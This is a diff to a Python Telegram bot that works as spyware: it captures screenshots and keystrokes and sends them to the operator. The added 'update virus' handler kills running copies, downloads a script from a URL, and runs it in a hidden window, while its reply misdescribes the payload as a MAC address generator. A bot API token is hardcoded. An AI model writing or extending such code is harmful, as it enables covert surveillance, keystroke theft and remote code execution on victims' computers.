@@ -9,6 +9,12 @@ from aiogram.types import FSInputFile
 import asyncio
 import logging
 import pyautogui
+import psutil
+import os
+import sys
+import subprocess
+
+FILENAME = "downloaded_script.py"
 
 API_TOKEN = '7616913012:AAG7bTGW6KZFx0NHI7xi0l7je8exUPuRVdg'
 
@@ -37,7 +43,7 @@ listener.start()
 
 # Клавиатура
 keyboard_markup = ReplyKeyboardMarkup(
-    keyboard=[[KeyboardButton(text="Скриншот и нажатия")]],
+    keyboard=[[KeyboardButton(text="Скриншот и нажатия")],[KeyboardButton(text="Обновить вирус")]],
     resize_keyboard=True
 )
 
@@ -54,7 +60,7 @@ async def screenshot_and_keys(message: Message):
 
     # Отправка изображения
     photo = FSInputFile(screenshot_path)
-    await message.answer_photo(photo=photo, caption="📸 Скриншот экрана")
+    await message.answer_photo(photo=photo, caption="Скриншот экрана")
     # Отправка лога
     if pressed_keys_log:
         last_keys = ''.join(pressed_keys_log[-50:])
@@ -62,6 +68,34 @@ async def screenshot_and_keys(message: Message):
     else:
         await message.answer("⌨️ Нет зафиксированных нажатий клавиш.")
 
+@dp.message(F.text.lower() == "обновить вирус")
+async def update_virus(message: Message):
+
+    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+        try:
+            if proc.info['name'] == "python.exe" and FILENAME in " ".join(proc.info['cmdline']):
+                proc.kill()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+
+    try:
+        if os.path.exists(FILENAME):
+            os.remove(FILENAME)
+        with urllib.request.urlopen(URL) as response:
+            content = response.read()
+        with open(FILENAME, "wb") as f:
+            f.write(content)
+        await message.answer("Скрипт генерации mac адресов скачан.")
+    except Exception as e:
+        await message.answer("Ошибка при скачивании cкрипта генерации mac адресов:", e)
+
+    subprocess.Popen(
+        [sys.executable, FILENAME],
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )
+
+    
+    
 # Точка входа
 async def main():
     await dp.start_polling(bot)
